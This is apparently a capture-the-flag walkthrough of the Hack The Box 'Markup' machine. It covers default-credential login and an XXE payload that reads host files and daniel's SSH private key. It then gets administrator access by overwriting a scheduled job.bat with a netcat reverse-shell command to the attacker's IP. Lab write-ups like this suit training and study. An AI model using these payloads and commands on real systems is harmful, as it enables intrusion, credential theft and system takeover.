# Markup

## Enumeration

nmap scan results.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ nmap -sC -sV 10.129.227.243
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 22:27 JST
Nmap scan report for 10.129.227.243
Host is up (0.25s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: MegaShopping
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.06 seconds

```

port 80

![image-20220107224034150](/home/funa/.config/Typora/typora-user-images/image-20220107224034150.png)

Attempting a number of default credentials lands us on a successful login.

![image-20220107224427607](/home/funa/.config/Typora/typora-user-images/image-20220107224427607.png)

We notice that the `Order` page could be of interest to us, since it presents us with a number of user input fields.

![image-20220107230626647](/home/funa/.config/Typora/typora-user-images/image-20220107230626647.png)

In order to better understand how this input functions, we will need to fire up BurpSuite, and interact with the input fields by filling in some random information and pressing the `Submit` button.

![image-20220107230745976](/home/funa/.config/Typora/typora-user-images/image-20220107230745976.png)

Searching for a XML exploitation cheatsheet we are met with several examples such as [the following](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity). From the above cheatsheet an excerpt can be taken that is of relevance to us.

```bash
Lets try to read /etc/passwd in different ways. For Windows you could try to read: C:\windows\system32\drivers\etc\hosts
In this first case notice that SYSTEM "file:///etc/passwd" will also work.

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

Switch to the Repeater tab at the top of the BurpSuite window and change the XML data section of the request to the following:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```

You can send the request from the Repeater and receive the server's Response with the data pictured below.

![image-20220107233916161](/home/funa/.config/Typora/typora-user-images/image-20220107233916161.png)

The output of the `/etc/hosts` file on the target itself is displayed in our response message, which proves that the XML External Entity vulnerability is present.

## Foothold

`Modified by Daniel` . This could be a hint towards a username present on the target system, since they would have access to the web page's source code for configuration purposes. Let's attempt to navigate to the `daniel` user's `.ssh` folder in order to attempt to retrieve their private key.

![image-20220108002911418](/home/funa/.config/Typora/typora-user-images/image-20220108002911418.png)

Next, copy the RSA key present in the Response in BurpSuite and paste it into the `daniel_rsa` file using the text editor of your choice. It's also important to set the right privilages for the `daniel_rsa` file so as to be accepted by your SSH client. The commands below will achieve and verify this.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ chmod 400 daniel_rsa

┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ ls -l
合計 5188
-rw-r--r-- 1 funa funa       0 Jan  7 22:21 Markup.md
-rw-r--r-- 1 funa funa 5293181 Jan  7 22:25 Markup.pdf
-r-------- 1 funa funa    2602 Jan  8 00:34 daniel_rsa
-rw-r--r-- 1 funa funa    8313 Jan  7 22:23 starting_point_l3ickey.ovpn
```

Following this, we can attempt to log in as the `daniel` user through our SSH client, using his private key.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ ssh -i daniel_rsa daniel@10.129.227.243

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

We are successful, and the user flag can be retrieved from `C:\Users\daniel\Desktop` .

```powershell
daniel@MARKUP C:\Users\daniel\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\daniel\Desktop

03/05/2020  06:18 AM    <DIR>          .
03/05/2020  06:18 AM    <DIR>          ..
03/05/2020  06:18 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)   7,396,552,704 bytes free
```

## Privilege Escalation

Let's check our current privileges by typing the command below.

```powershell
daniel@MARKUP C:\Users\daniel\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

Seeing as the privileges listed for the `daniel` user are not of very unique importance.

```powershell
daniel@MARKUP C:\Users\daniel\Desktop>cd C:\

daniel@MARKUP C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\

03/12/2020  02:56 AM    <DIR>          Log-Management
09/14/2018  11:12 PM    <DIR>          PerfLogs
07/28/2021  01:01 AM    <DIR>          Program Files
09/14/2018  11:21 PM    <DIR>          Program Files (x86)
07/28/2021  02:38 AM                 0 Recovery.txt
03/05/2020  04:40 AM    <DIR>          Users
07/28/2021  01:16 AM    <DIR>          Windows
03/05/2020  09:15 AM    <DIR>          xampp
               1 File(s)              0 bytes
               7 Dir(s)   7,395,323,904 bytes free

daniel@MARKUP C:\>cd Log-Management

daniel@MARKUP C:\Log-Management>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Log-Management

03/12/2020  02:56 AM    <DIR>          .
03/12/2020  02:56 AM    <DIR>          ..
03/06/2020  01:42 AM               346 job.bat
               1 File(s)            346 bytes
               2 Dir(s)   7,396,372,480 bytes free

daniel@MARKUP C:\Log-Management>type job.bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

`job.bat` file itself can only be run by an Administrator, we could try our luck and see if our usergroup could at least edit the file, instead of running it, or if there are any mismatched permissions between the script and the usergroup or file configuration. We can achieve this by using the `icacls` commad.

```powershell
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We might be able to get a shell by transferring `netcat` to the system and modifying the script to execute a reverse shell.

Before then, we need to check if the ` wevtutil` process mentioned in the `job.bat` file is running. We can see the currently scheduled tasks by typing the `schtasks` command. If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use powershell's `ps` command instead, which represents another security misconfiguration that works against the server.

```powershell
daniel@MARKUP C:\Log-Management>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Log-Management> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
...
    361      22     9120      20980              1752   0 vmtoolsd
    201      16     4764      13660              3700   1 vmtoolsd
     31       5      744       2044              4012   1 wevtutil
    170      11     1500       7024               480   0 wininit
    259      12     2600      11472               540   1 winlogon
    316      15     7700      16820              2944   0 WmiPrvSE
```

We can see that the process `wevtutil` is running, which is the same process listed in the `job.bat` file. This indicates that the `.bat` script might be executing.

Because the target host does not have access to the Internet, we will need to deliver the `nc64.ext` executable through our own connection with the target. In order to download the executable on our system, we can use this link:

```
https://github.com/int0x33/nc.exe/blob/master/nc64.exe
```

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
--2022-01-08 01:49:44--  https://github.com/int0x33/nc.exe/blob/master/nc64.exe
github.com (github.com) をDNSに問いあわせています... 52.69.186.44
github.com (github.com)|52.69.186.44|:443 に接続しています... 接続しました。
HTTP による接続要求を送信しました、応答を待っています... 200 OK
長さ: 特定できません [text/html]
`nc64.exe' に保存中

nc64.exe                          [ <=>                                            ] 156.47K  --.-KB/s 時間 0.06s

2022-01-08 01:49:45 (2.36 MB/s) - `nc64.exe' へ保存終了 [160222]


┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ ls
Markup.md  Markup.pdf  daniel_rsa  nc64.exe  starting_point_l3ickey.ovpn  user.txt

┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Switching to the shell we have on the host, we can issue the download command targetting our own IP address on the VPN.

```powershell
PS C:\Log-Management> wget http://{your_IP}:8000/nc64.exe -outfile nc64.exe
PS C:\Log-Management> dir


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
-a----         1/7/2022  10:03 AM         160222 nc64.exe


PS C:\Log-Management> exit

daniel@MARKUP C:\Log-Management>
```

Since we have full control over the `job.bat` script, we will modify its' contents by running the following command.

```powershell
daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.66 1234 > C:\Log-Management\job.bat

daniel@MARKUP C:\Log-Management>type job.bat
C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port}
```

We will turn on the `netcat` listener and wait for the script to execute.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Markup]
└─$ nc -lvnp {port}
listening on [any] {port} ...
```

Once the script executes, we receive a shell on the terminal tab the listener was active on.

```powershell
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator\Desktop

03/05/2020  06:33 AM    <DIR>          .
03/05/2020  06:33 AM    <DIR>          ..
03/05/2020  06:33 AM                70 root.txt
               1 File(s)             70 bytes
               2 Dir(s)   7,417,131,008 bytes free
```

Congratulations!